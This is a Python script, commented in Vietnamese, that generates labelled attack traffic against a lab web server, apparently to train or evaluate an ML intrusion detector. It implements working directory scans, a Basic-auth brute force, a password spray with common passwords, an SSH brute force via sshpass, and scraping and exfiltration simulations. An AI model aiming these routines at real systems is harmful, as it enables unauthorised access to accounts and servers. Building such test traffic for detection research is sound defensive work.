"""Kịch bản TẤN CÔNG cho lab ML (chạy trên máy client của lab, Python 3 stdlib + sshpass), chỉ nhắm vào máy WEB của lab.

Mỗi kịch bản dùng một IP riêng trong dải --ips (theo thứ tự: scan_dirs = IP đầu, portal_bruteforce = IP thứ hai...), khác
dải người dùng bình thường. Nhãn mỗi lần chạy ghi vào --log: {"scenario", "ip", "start", "end"} (ISO có múi giờ),
dùng cho `tools/ml_eval.py eval`.

    python3 attacks.py --web 10.10.1.132 --ips 10.10.1.60-69 --dev ens37 --users /opt/labsim/users.txt \
        --scenario all|scan_dirs|portal_bruteforce|password_spray|ssh_bruteforce|slow_scan|scraper|exfil
"""
from __future__ import annotations

import argparse
import base64
import http.client
import json
import random
import subprocess
import time
from datetime import datetime
from pathlib import Path

UA = "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
WORDS = ("admin login wp-admin wp-login.php phpmyadmin backup backups old test dev staging config conf .env .git .svn "
         "cgi-bin api v1 v2 uploads upload files images img js css static assets includes inc lib vendor tmp temp logs log "
         "db database sql dump data private secret secrets internal intranet manager console panel dashboard server-status "
         "status info.php phpinfo.php index.bak web.config robots.txt sitemap.xml shell cmd debug install setup readme "
         "license changelog users user account accounts register signup passwd shadow download downloads docs doc "
         "archive archives public hidden cache core app apps src bin sbin etc home root portal reports").split()
EXTS = ["", "/", ".php", ".html", ".bak", ".txt", ".zip", ".old"]
PAGES = ["/", "/news/", "/docs/"] + [f"/news/tin-{i}.html" for i in range(1, 31)] + ["/assets/site.css", "/assets/site.js"]
DOCS = [f"/docs/tai-lieu-{i}.pdf" for i in range(1, 9)]
ORDER = ["scan_dirs", "portal_bruteforce", "password_spray", "ssh_bruteforce", "slow_scan", "scraper", "exfil"]


def ip_range(spec: str) -> list[str]:
    base, _, last = spec.rpartition("-")
    head, _, first = base.rpartition(".")
    return [f"{head}.{i}" for i in range(int(first), int(last) + 1)]


def load_users(path: str) -> list[tuple[str, str, str]]:
    out = []
    for line in Path(path).read_text(encoding="utf-8").replace("\r", "").splitlines():
        if line.strip() and not line.lstrip().startswith("#"):
            name, pw, role = [x.strip() for x in line.split("|")]
            out.append((name, pw, role))
    return out


class Attacker:
    def __init__(self, a: argparse.Namespace, ip: str) -> None:
        self.a, self.ip, self.rng = a, ip, random.Random(a.seed)
        self.conn = http.client.HTTPConnection(a.web, 80, timeout=20, source_address=(ip, 0))

    def get(self, path: str, cred: str | None = None) -> int:
        h = {"User-Agent": UA, "Accept": "*/*"}
        if cred:
            h["Authorization"] = "Basic " + base64.b64encode(cred.encode()).decode()
        for _ in range(2):                       # kết nối keep-alive có thể bị server đóng giữa chừng
            try:
                self.conn.request("GET", path, headers=h)
                r = self.conn.getresponse()
                r.read()
                return r.status
            except (OSError, http.client.HTTPException):
                self.conn.close()
        return 0

    def paced(self, n: int, seconds: float):
        """Phát n lần lặp trải đều trong `seconds` giây (theo đồng hồ, không dồn lại khi một request chậm)."""
        t0 = time.monotonic()
        for i in range(n):
            yield i
            time.sleep(max(0.0, t0 + (i + 1) * seconds / n - time.monotonic()))

    # ---- các kịch bản (giá trị ghim trong kế hoạch)
    def scan_dirs(self) -> None:
        paths = [f"/{w}{e}" for w in WORDS for e in EXTS]
        for i in self.paced(400, 60):
            self.get(self.rng.choice(paths))

    def portal_bruteforce(self) -> None:
        name = self.a.users_list[0][0]
        for i in self.paced(150, 300):
            self.get("/portal/", f"{name}:sai-{self.rng.randint(0, 10**6)}")

    def password_spray(self) -> None:
        users = self.a.users_list[:20]
        attempts = [(n, k) for k in range(2) for n, _, _ in users]          # vòng 1 cho mọi user rồi mới tới vòng 2
        for i in self.paced(len(attempts), 600):
            n, k = attempts[i]
            self.get("/portal/", f"{n}:{['Password1', 'Summer2026'][k]}")

    def ssh_bruteforce(self) -> None:
        for i in self.paced(40, 600):
            subprocess.run(["sshpass", "-p", f"sai-{i}", "ssh", "-b", self.ip, "-o", "StrictHostKeyChecking=no",
                            "-o", "UserKnownHostsFile=/dev/null", "-o", "ConnectTimeout=10", "-o", "LogLevel=ERROR",
                            f"lab_an@{self.a.web}", "true"], capture_output=True, timeout=60)

    def slow_scan(self) -> None:
        paths = [f"/{w}{e}" for w in WORDS for e in EXTS]
        for i in self.paced(90, 1800):                                      # 1 request mỗi 20 s
            self.get(self.rng.choice(paths))

    def scraper(self) -> None:
        for i in self.paced(3 * len(PAGES), 180):
            self.get(PAGES[i % len(PAGES)])

    def exfil(self) -> None:
        for i in self.paced(8 * 5, 600):
            self.get(DOCS[i % len(DOCS)])


def ensure_aliases(ips: list[str], dev: str) -> None:
    have = subprocess.run(["ip", "-4", "-o", "addr", "show", "dev", dev], capture_output=True, text=True).stdout
    for ip in ips:
        if f" {ip}/" not in have:
            subprocess.run(["ip", "addr", "add", f"{ip}/24", "dev", dev], check=True)


def main() -> None:
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--web", required=True)
    ap.add_argument("--ips", required=True)
    ap.add_argument("--dev", required=True)
    ap.add_argument("--users", required=True)
    ap.add_argument("--scenario", default="all")
    ap.add_argument("--log", default="/var/log/labsim/attacks.jsonl")
    ap.add_argument("--seed", type=int, default=20261117)
    a = ap.parse_args()
    if a.scenario != "all" and a.scenario not in ORDER:
        raise SystemExit(f"kịch bản không có: {a.scenario} (chọn: all, {', '.join(ORDER)})")
    a.users_list = load_users(a.users)
    ips = ip_range(a.ips)
    if len(ips) < len(ORDER):
        raise SystemExit(f"cần {len(ORDER)} IP, dải chỉ có {len(ips)}")
    ensure_aliases(ips, a.dev)
    Path(a.log).parent.mkdir(parents=True, exist_ok=True)
    for name, ip in zip(ORDER, ips):
        if a.scenario not in ("all", name):
            continue
        now = lambda: datetime.now().astimezone().isoformat(timespec="seconds")  # noqa: E731
        start = now()
        getattr(Attacker(a, ip), name)()
        rec = {"scenario": name, "ip": ip, "start": start, "end": now()}
        with open(a.log, "a", encoding="utf-8") as fh:
            fh.write(json.dumps(rec) + "\n")
        print(json.dumps(rec), flush=True)


if __name__ == "__main__":
    main()
